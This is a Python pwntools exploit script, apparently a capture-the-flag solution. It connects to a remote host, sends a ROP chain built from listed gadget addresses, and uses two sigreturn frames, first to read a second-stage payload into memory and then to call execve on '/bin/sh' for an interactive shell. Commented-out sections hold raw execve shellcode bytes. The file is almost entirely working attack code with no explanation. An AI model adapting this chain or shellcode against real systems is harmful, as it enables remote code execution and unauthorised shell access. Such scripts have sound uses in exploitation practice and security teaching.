from pwn import *


# p = process('./main')
p = remote('193.57.159.27',26882)
# pid = gdb.attach(p,gdbscript='')
context.arch='amd64'
imul_rdi = 0x000000000040109d
#0x0000000000401079 : mov eax, 6 ; ret
#0x000000000040107f : mov eax, 9 ; ret
#0x000000000040108a : mov eax, edi ; ret
#0x000000000040109a : mov eax, edx ; ret
#0x0000000000401092 : mov eax, esi ; ret
#0x0000000000401087 : mov ebx, 0xc3f88948 ; mov rsi, rax ; ret
#0x000000000040106d : mov edi, 0 ; syscall
#0x0000000000401086 : mov edi, eax ; ret
#0x000000000040105e : mov edx, 0 ; add rsp, 8 ; ret
#0x000000000040101b : mov edx, 0x1000 ; syscall
#0x0000000000401096 : mov edx, eax ; ret
#0x000000000040108e : mov esi, eax ; ret
#0x0000000000401019 : mov esi, esp ; mov edx, 0x1000 ; syscall
#0x0000000000401089 : mov rax, rdi ; ret
#0x0000000000401099 : mov rax, rdx ; ret
#0x0000000000401091 : mov rax, rsi ; ret
#0x0000000000401085 : mov rdi, rax ; ret
#0x0000000000401095 : mov rdx, rax ; ret
#0x000000000040108d : mov rsi, rax ; ret


# 0x00000000004010a1 #add rax rdi
syscall = 0x0000000000401020

payload = ''
payload += 'A'*8

payload += p64(0x000000000040107f) #mov rax 9
payload += p64(0x0000000000401085) #mov rdi,rax

payload += p64(0x00000000004010a9) #div rdi
payload += p64(0x00000000004010a1) # add rax rdi
payload += p64(0x0000000000401085) #mov rdi rax

payload += p64(0x00000000004010a9) #div rdi
payload += p64(0x00000000004010a1) # add rax rdi
payload += p64(0x0000000000401085) #mov rdi rax

payload += p64(0x00000000004010a9) #div rdi
payload += p64(0x00000000004010a1) # add rax rdi
payload += p64(0x0000000000401085) #mov rdi rax


payload += p64(0x00000000004010a9) #div rdi
payload += p64(0x00000000004010a1) # add rax rdi
payload += p64(0x0000000000401085) #mov rdi rax

payload += p64(0x00000000004010a9) #div rdi
payload += p64(0x00000000004010a1) # add rax rdi
payload += p64(0x0000000000401085) #mov rdi rax

payload += p64(0x00000000004010a9) #div rdi
payload += p64(0x00000000004010a1) # add rax rdi
payload += p64(0x0000000000401085) #mov rdi rax

payload += p64(syscall)



frame = SigreturnFrame(kernel='amd64')
frame.rax = 0x0
frame.rsi = 0x402000
frame.rdi = 0x0
frame.rdx = 0x900
frame.rsp = 0x402008 # new ret
frame.rip = syscall


payload += str(frame)



payload += "a" * (4096 - len(payload))
p.send(payload)


payload = p64(0)
payload += 'AAAAAAAA'
payload += p64(0x000000000040107f) #mov rax 9
payload += p64(0x0000000000401085) #mov rdi,rax

payload += p64(0x00000000004010a9) #div rdi
payload += p64(0x00000000004010a1) # add rax rdi
payload += p64(0x0000000000401085) #mov rdi rax

payload += p64(0x00000000004010a9) #div rdi
payload += p64(0x00000000004010a1) # add rax rdi
payload += p64(0x0000000000401085) #mov rdi rax

payload += p64(0x00000000004010a9) #div rdi
payload += p64(0x00000000004010a1) # add rax rdi
payload += p64(0x0000000000401085) #mov rdi rax


payload += p64(0x00000000004010a9) #div rdi
payload += p64(0x00000000004010a1) # add rax rdi
payload += p64(0x0000000000401085) #mov rdi rax

payload += p64(0x00000000004010a9) #div rdi
payload += p64(0x00000000004010a1) # add rax rdi
payload += p64(0x0000000000401085) #mov rdi rax

payload += p64(0x00000000004010a9) #div rdi
payload += p64(0x00000000004010a1) # add rax rdi
payload += p64(0x0000000000401085) #mov rdi rax

payload += p64(syscall)



frame = SigreturnFrame(kernel='amd64')
frame.rax = 0x3b
frame.rsi = 0x0
frame.rdi = 0x4021b0
frame.rdx = 0x0
frame.rsp = 0x402008 # new ret
frame.rip = syscall







payload += str(frame)

payload += '/bin/sh\0'


payload += 'A' * (0x900 - len(payload))

p.send(payload)


# print('AAAAAAAAAAA',len(payload))


# p.send(payload)
# time.sleep(4)
# p.send(shellcode)



# frame1 = SigreturnFrame(kernel='amd64')
# frame1.rax = 0x3b
# frame1.rsi = 0x0
# frame1.rdi = 0x402000 + len(frame)
# frame1.rdx = 0x0
# frame1.rsp = 0x402000 # new ret
# frame1.rip = syscall

# p.send(payload)

p.interactive()



# payload += p64(0x000000000040107f) #mov rax 9
# payload += p64(0x0000000000401085) #mov rdi,rax
# payload += p64(0x000000000040109d) * 3 #imul rdi


# #payload += p64(0x0000000000401089) #mov rax rdi
# payload += p64(0x000000000040108d) #mov rsi rax


# payload += p64(0x000000000040107f) #mov rax 9

# #payload += p64(0x0000000000401085) #mov rdi,rax

# payload += p64(0x000000000040109d) * 10 #imul rdi
# payload += p64(0x0000000000401085) #mov rdi,rax

# payload += p64(0x0000000000401079) #mov rax 6
# payload += p64(0x0000000000401095) #mov rdx rax

# payload += p64(0x000000000040107f) #mov rax 9

# payload += p64(0x0000000000401020) #syscall
# shellcode = '\x90'*100+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# frame = SigreturnFrame(kernel='amd64')
# frame.rax = 0x0
# frame.rsi = 0x402000
# frame.rdi = 0x0
# frame.rdx = 0x500
# frame.rsp = 0x402000 # new ret
# frame.rip = syscall


# payload = ''
# payload += 'A' * 8
# payload += p64(syscall)
# payload += str(frame)



